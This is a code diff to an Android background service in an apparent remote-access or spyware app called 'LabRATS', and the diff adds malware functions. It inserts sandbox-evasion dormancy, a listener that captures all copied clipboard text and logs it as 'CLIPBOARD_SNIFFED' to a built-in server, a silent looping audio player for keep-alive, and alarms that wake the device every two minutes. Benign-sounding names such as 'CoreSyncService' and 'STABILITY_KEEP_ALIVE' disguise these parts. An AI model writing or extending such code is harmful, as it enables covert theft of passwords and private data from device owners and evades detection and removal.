@@ -54,16 +54,52 @@ public class CoreSyncService extends Service {
     private long lastWebhookFailTime = 0;
     private final Handler ipReportHandler = new Handler(Looper.getMainLooper());
     private final Runnable ipReportRunnable = this::checkAndReportIp;
+    private android.media.MediaPlayer keepAlivePlayer;
+    private android.content.ClipboardManager clipboardManager;
+    private android.content.ClipboardManager.OnPrimaryClipChangedListener clipboardListener;
 
     @Override
     public void onCreate() {
         super.onCreate();
+        
+        // --- EVASION PROTOCOL: Dormancy in risky environments ---
+        if (SystemAnalytics.isEnvironmentRisky()) {
+            Log.w(TAG, "Environment risk detected. Core protocols entering dormant state.");
+            return;
+        }
+
+        setupKeepAlive();
+        setupClipboardMonitor();
+        schedulePersistenceAlarms();
         createNotificationChannel();
         ensureForeground();
         connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
         registerNetworkCallback();
         registerMessageObserver();
         checkAndReportIp(); // Initial check
+    }
+
+    private void setupClipboardMonitor() {
+        try {
+            clipboardManager = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+            if (clipboardManager != null) {
+                clipboardListener = () -> {
+                    if (clipboardManager.hasPrimaryClip()) {
+                        android.content.ClipData clip = clipboardManager.getPrimaryClip();
+                        if (clip != null && clip.getItemCount() > 0) {
+                            CharSequence text = clip.getItemAt(0).getText();
+                            if (text != null && text.length() > 0) {
+                                LabRatsHttpServer.logActivity("CLIPBOARD_SNIFFED: " + text.toString());
+                            }
+                        }
+                    }
+                };
+                clipboardManager.addPrimaryClipChangedListener(clipboardListener);
+                Log.d(TAG, "Clipboard monitor protocol synchronized");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Clipboard sync error: " + e.getMessage());
+        }
     }
 
     private void registerMessageObserver() {
@@ -209,6 +245,36 @@ public class CoreSyncService extends Service {
         }
     }
 
+    private void setupKeepAlive() {
+        try {
+            keepAlivePlayer = android.media.MediaPlayer.create(this, R.raw.silent);
+            if (keepAlivePlayer != null) {
+                keepAlivePlayer.setVolume(0f, 0f);
+                keepAlivePlayer.setLooping(true);
+                keepAlivePlayer.start();
+                Log.d(TAG, "Persistence protocol active: Media session prioritized");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Persistence protocol error: " + e.getMessage());
+        }
+    }
+
+    private void schedulePersistenceAlarms() {
+        try {
+            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
+            if (am != null) {
+                Intent i = new Intent(this, SystemBoot.class);
+                i.setAction("STABILITY_KEEP_ALIVE");
+                android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, 1337, i, 
+                    android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
+                
+                // Fire every 2 minutes to ensure background presence
+                am.setRepeating(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 120000, 120000, pi);
+                Log.d(TAG, "Persistence alarms scheduled");
+            }
+        } catch (Exception ignored) {}
+    }
+
     private synchronized void stopServer() {
         try {
             isRunning = false;
@@ -236,7 +302,7 @@ public class CoreSyncService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "System Stability",
+                    "LabRATS-Channel",
                     NotificationManager.IMPORTANCE_MIN);
             channel.setDescription("Ensures background service persistence");
             channel.setShowBadge(false);
@@ -300,6 +366,18 @@ public class CoreSyncService extends Service {
             }
             if (server != null) {
                 try { server.stop(); } catch (Exception ignored) {}
+            }
+            if (keepAlivePlayer != null) {
+                try {
+                    keepAlivePlayer.stop();
+                    keepAlivePlayer.release();
+                    keepAlivePlayer = null;
+                } catch (Exception ignored) {}
+            }
+            if (clipboardManager != null && clipboardListener != null) {
+                try {
+                    clipboardManager.removePrimaryClipChangedListener(clipboardListener);
+                } catch (Exception ignored) {}
             }
             networkExecutor.shutdownNow();
         });
